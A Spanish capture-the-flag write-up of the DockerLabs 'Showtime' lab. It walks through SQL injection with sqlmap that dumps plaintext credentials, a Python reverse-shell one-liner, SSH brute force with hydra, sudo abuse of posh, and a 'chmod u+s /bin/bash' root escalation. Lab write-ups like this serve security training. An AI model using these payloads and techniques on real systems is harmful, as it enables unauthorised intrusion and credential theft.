---
title: DockerLabs - Showtime
summary: "Write-up del laboratorio Showtime de DockerLabs"
author: elcybercurioso
date: 2025-11-09
categories: [Post, DockerLabs]
tags: [fácil, sqli, rce, credentials leaking, brute force, sudo]
media_subpath: "/assets/img/posts/dockerlabs_showtime"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs]
└─$ nmap -sCV -p22,80 172.17.0.2                                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: cs
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Comenzamos revisando la página principal del servidor web del laboratorio, donde nos encontramos lo que parece ser una página de apuestas:

![Desktop View](/20251109134807.webp){: width="972" height="589" .shadow}

Vemos que en la esquina derecha arriba hay un botón que nos redirige a un panel de autenticación:

![Desktop View](/20251109134900.webp){: width="410" height="330" .shadow}

Haciendo algunas pruebas, nos damos cuenta de que es vulnerable a una inyección SQL:

![Desktop View](/20251109134917.webp){: width="410" height="330" .shadow}

## explotación

Debido a esto, podemos extraer información de la base de datos empleando `sqlmap`, y una petición que hayamos interceptado con Burp Suite y la hayamos guardado en un fichero .txt:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ sqlmap -r request.txt --dbs --batch                                           
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:52:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[12:52:04] [INFO] fetching database names
[12:52:04] [INFO] retrieved: 'mysql'
[12:52:04] [INFO] retrieved: 'information_schema'
[12:52:04] [INFO] retrieved: 'performance_schema'
[12:52:04] [INFO] retrieved: 'sys'
[12:52:04] [INFO] retrieved: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```

Una vez obtenidas las bases de datos existentes, procedemos a obtener las tablas de la base de datos `users`, la cual parece ser la que va a contener información interesante:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ sqlmap -r request.txt -D users --tables --batch
        ___
       __H__                                                                                                                                                            
 ___ ___[']_____ ___ ___  {1.9.9#stable}                                                                                                                                
|_ -| . [)]     | .'| . |                                                                                                                                               
|___|_  [)]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                            

[12:52:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[12:52:58] [INFO] fetching tables for database: 'users'
[12:52:58] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

Sabemos que la base de datos es `users`, y la única tabla existente es `usuarios`, pero nos faltan las columnas de dicha tabla:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ sqlmap -r request.txt -D users -T usuarios --columns --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9#stable}
|_ -| . [']     | .'| . |
|___|_  [`]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[12:53:39] [INFO] fetching columns for table 'usuarios' in database 'users'
[12:53:39] [INFO] retrieved: 'id'
[12:53:39] [INFO] retrieved: 'int unsigned'
[12:53:39] [INFO] retrieved: 'password'
[12:53:39] [INFO] retrieved: 'varchar(50)'
[12:53:39] [INFO] retrieved: 'username'
[12:53:39] [INFO] retrieved: 'varchar(50)'
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int unsigned |
| password | varchar(50)  |
| username | varchar(50)  |
+----------+--------------+
```

Una vez tenemos toda esta información, podemos extraer los datos que nos interesa, que en este caso son los usuarios y la contraseñas, las cuales podríamos llegar a reutilizar en otros servicios:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ sqlmap -r request.txt -D users -T usuarios -C username,password --dump --batch
        ___
       __H__                                                                                                                                                            
 ___ ___["]_____ ___ ___  {1.9.9#stable}                                                                                                                                
|_ -| . ["]     | .`| . |                                                                                                                                               
|___|_  [,]_|_|_|__,|  _|                                                                                                                                               
      |_|V...       |_|   https://sqlmap.org                                                                                                                            

[12:54:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[12:54:29] [INFO] fetching entries of column(s) 'password,username' for table 'usuarios' in database 'users'
[12:54:29] [INFO] retrieved: '123321123321'
[12:54:29] [INFO] retrieved: 'lucas'
[12:54:29] [INFO] retrieved: '123456123456'
[12:54:29] [INFO] retrieved: 'santiago'
[12:54:29] [INFO] retrieved: 'MiClaveEsInhackeable'
[12:54:29] [INFO] retrieved: 'joe'
Database: users
Table: usuarios
[3 entries]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| lucas    | 123321123321         |
| santiago | 123456123456         |
| joe      | MiClaveEsInhackeable |
+----------+----------------------+
```

## acceso inicial (www-data)

Revisando las credenciales que hemos encontrado, vemos que al loguearnos como `joe`, nos encontramos con una funcionalidad que permite ejecutar comandos en Python:

![Desktop View](/20251109135929.webp){: width="410" height="330" .shadow}

Si no existen filtros aplicados a esta ejecución, nos podemos entablar una conexión reversa para obtener una consola remota empleando el siguiente comando (sin olvidarnos primero de ponernos en escucha, por ejemplo, con `nc`):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<nuestra IP>",<nuestro puerto>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

Una vez ejecutado el comando, veremos que habremos obtenido una conexión en la máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ nc -nlvp 4444                     
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38440
www-data@51b14e55adbd:/var/www/html/login_page$ whoami
whoami
www-data
www-data@51b14e55adbd:/var/www/html/login_page$ hostname -I
hostname -I
172.17.0.2
```

Tratamos la TTY para poder operar con mayor facilidad:

```bash
www-data@51b14e55adbd:/var/www/html/login_page$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@51b14e55adbd:/var/www/html/login_page$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                        
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ stty raw -echo;fg                                                        
[1]  + continued  nc -nlvp 4444
                               reset xterm 
www-data@51b14e55adbd:/var/www/html/login_page$ export TERM=xterm
www-data@51b14e55adbd:/var/www/html/login_page$ export SHELL=bash
www-data@51b14e55adbd:/var/www/html/login_page$ stty rows 48 columns 210
```

## movimiento lateral (joe)

Revisamos los usuarios los cuales debemos tener en cuenta a la hora de tratar de movernos tanto lateralmente como para escalar privilegios:

```bash
www-data@51b14e55adbd:/home$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
joe:x:1001:1001:joe,,,:/home/joe:/bin/bash
luciano:x:1002:1002:luciano,,,:/home/luciano:/bin/bash
```

En la carpeta `/tmp` encontramos un fichero oculto llamado `.hidden_text.txt`:

```bash
www-data@51b14e55adbd:/tmp$ ls -la
total 20
drwxrwxrwt 1 root     root     4096 Nov  9 10:00 .
drwxr-xr-x 1 root     root     4096 Nov  9 09:40 ..
-rw-r--r-- 1 root     root      894 Jul 22  2024 .hidden_text.txt
-rw-r--r-- 1 www-data www-data  206 Nov  9 10:00 temp_script.py
drwx------ 2 mysql    mysql    4096 Jul 22  2024 tmp.w3E3JvWoeD
```

El contenido de dicho fichero es un mensaje a otro usuario con códigos de GTA San Andreas:

```bash
www-data@51b14e55adbd:/tmp$ cat .hidden_text.txt
Martin, esta es mi lista de mis trucos favoritos de gta sa:


HESOYAM
UZUMYMW
JUMPJET
LXGIWYL
KJKSZPJ
YECGAA
SZCMAWO
...
```

Tratamos de ver si alguno de estos códigos es la contraseña del usuario `joe` o `luciano`, pero no es el caso.

Por ello, probamos a convertir todos los códigos a minúsculas, y volvemos a probar:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ cat passwords.txt | tr '[:upper:]' '[:lower:]' > lower_passwords.txt
```

Esta vez, encontramos que uno de los códigos es en efecto la contraseña del usuario `joe`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ hydra -L users.txt -P lower_passwords.txt ssh://172.17.0.2 -I -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-09 13:16:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 156 login tries (l:2/p:78), ~3 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: joe   password: c*******************
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-09 13:17:05
```

Nos conectamos como `joe`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Showtime]
└─$ ssh joe@172.17.0.2  
joe@172.17.0.2`s password: 
joe@51b14e55adbd:~$ whoami
joe
```

## movimiento lateral (luciano)

Revisamos los permisos SUDO del usuario `joe`, y vemos que podemos ejecutar el binario `/bin/posh` (motor de customización del texto de la terminal) como el usuario `luciano`:

```bash
joe@51b14e55adbd:~$ sudo -l
Matching Defaults entries for joe on 51b14e55adbd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joe may run the following commands on 51b14e55adbd:
    (luciano) NOPASSWD: /bin/posh
```

 Encontramos en [GTFOBins](https://gtfobins.github.io/gtfobins/posh/#sudo) que podemos invocar una consola como otro usuario empleando el siguiente comando:

![Desktop View](/20251109142015.webp){: width="972" height="589" .shadow}

Ejecutamos el comando, y nos convertimos en el usuario `luciano`:

```bash
joe@51b14e55adbd:~$ sudo -u luciano posh
$ whoami
luciano
```

## escalada de privilegios (root)

Comprobamos también los permisos SUDO del usuario `luciano`, el cual puede ejecutar un cierto script en Bash:

```bash
luciano@51b14e55adbd:/home$ sudo -l
Matching Defaults entries for luciano on 51b14e55adbd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luciano may run the following commands on 51b14e55adbd:
    (root) NOPASSWD: /bin/bash /home/luciano/script.sh
```

Al ir a comprobar los permisos que tiene dicho script, nos damos cuenta de que podemos editarlo, ya que el usuario `luciano` es el propietario de este script:

```bash
ciano@51b14e55adbd:/home$ ls -la /home/luciano/script.sh
-rw-rw-r-- 1 luciano luciano 112 Jul 23  2024 /home/luciano/script.sh
```

Revisamos los permisos que tiene la `/bin/bash` antes de ejecutar el comando:

```bash
luciano@51b14e55adbd:/home$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Procedemos a editarlo de la siguiente manera, ya que el laboratorio no cuenta ni con `nano` ni con `vim`:

```bash
luciano@51b14e55adbd:/home$ echo 'chmod u+s /bin/bash' > /home/luciano/script.sh
```

Lo ejecutamos, y vemos que los permisos del binario `/bin/bash` han cambiado, y ahora tiene permisos SUID:

```bash
luciano@51b14e55adbd:/home$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Una vez que tiene estos permisos, podemos invocar una consola como el usuario `root`:

```bash
luciano@51b14e55adbd:/home$ bash -p
bash-5.2# whoami
root
```

De esta manera, habremos completado la máquina Showtime!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>